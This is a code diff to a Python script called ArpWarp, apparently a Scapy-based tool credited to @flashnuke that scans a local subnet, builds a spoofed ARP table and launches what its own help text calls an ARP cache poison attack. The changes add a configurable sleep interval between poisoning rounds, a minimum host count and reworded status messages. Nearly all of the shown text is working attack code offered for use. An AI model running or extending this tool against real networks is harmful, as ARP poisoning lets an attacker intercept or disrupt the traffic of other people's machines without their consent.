@@ -31,27 +31,27 @@ class ArpWarp:
     _P_TIMEOUT = 2
     _DEF_CIDR = 24 # todo argparse
 
-    def __init__(self, iface, cidr):
+    def __init__(self, iface, cidr, s_time):
         self.network_interface = iface
         self.cidr = cidr
 
         self.my_mac = Ether().src
         self.my_private_ip = get_if_addr(self.network_interface)
 
-        self.arp_poison_interval = 1
+        self.arp_poison_interval = s_time
 
         self.subnet = self.my_private_ip.split(".")[:3]
 
         self.original_arp_cache = self.generate_original_cache()
-        if not len(self.original_arp_cache):
-            raise Exception("No hosts were found on the network")
+        if len(self.original_arp_cache) <= 1:
+            raise Exception(f"Not enough hosts -> {len(self.original_arp_cache)}")
         self.poisoned_arp_cache = self.generate_poisoned_cache()
 
         self.abort = False
 
     def generate_original_cache(self) -> Dict[str, str]:
         arp_cache = dict()
-        print(f"[*] Generating original ARP table for subnet {'.'.join(self.subnet)}.x, this might take 1-2 minutes...")
+        print(f"[*] Generating original ARP cache for subnet {'.'.join(self.subnet)}.x, this might a minute...")
 
         subnet = ".".join(self.subnet + ["0"])
         arp_request = ARP(pdst=f"{subnet}/{self.cidr}")
@@ -81,8 +81,7 @@ class ArpWarp:
         print(f"[*] Preparing poisoned ARP table...")
         for index, host_ip in enumerate(self.original_arp_cache.keys()):
             poisoned_table[host_ip] = spoofed_values[index]
-            print(f"[*] Host {host_ip}\toriginal {self.original_arp_cache[host_ip]}"
-                  f"\t spoofed {poisoned_table[host_ip]}")
+            print(f"[*] Host {host_ip} original -> {self.original_arp_cache[host_ip]} spoofed -> {poisoned_table[host_ip]}")
 
         print(f"[*] Poisoned ARP table is ready")
         return poisoned_table
@@ -146,6 +145,7 @@ class ArpWarp:
 
 
 if __name__ == "__main__":
+    print(f"\n{banner}\nWritten by @flashnuke\n{'=' * 49}")
     parser = argparse.ArgumentParser(description=f'Perform an ARP cache poison attack',
                                      usage=f"./{os.path.basename(__file__)} iface")
     parser.add_argument("-i", "--network-interface", dest='iface', type=str, metavar=(""),
@@ -155,8 +155,13 @@ if __name__ == "__main__":
     parser.add_argument("-m", "--set-mask", dest='mask', type=int, metavar=(""), default=24,
                         help="set the mask range (default -> /24 which means 0-256",
                         required=False)
+
+    parser.add_argument("-s", "--sleep-interval", dest='s_time', type=int, metavar=(""), default=1,
+                        help="set the sleep time between each arp poison attempt (default -> 1[sec])",
+                        required=False)
     arguments = parser.parse_args()
 
     print(f"[*] Setting up a new attacker...")
-    warper = ArpWarp(arguments.iface, arguments.mask)
+    warper = ArpWarp(arguments.iface, arguments.mask, arguments.s_time)
     warper.start_attack()
+
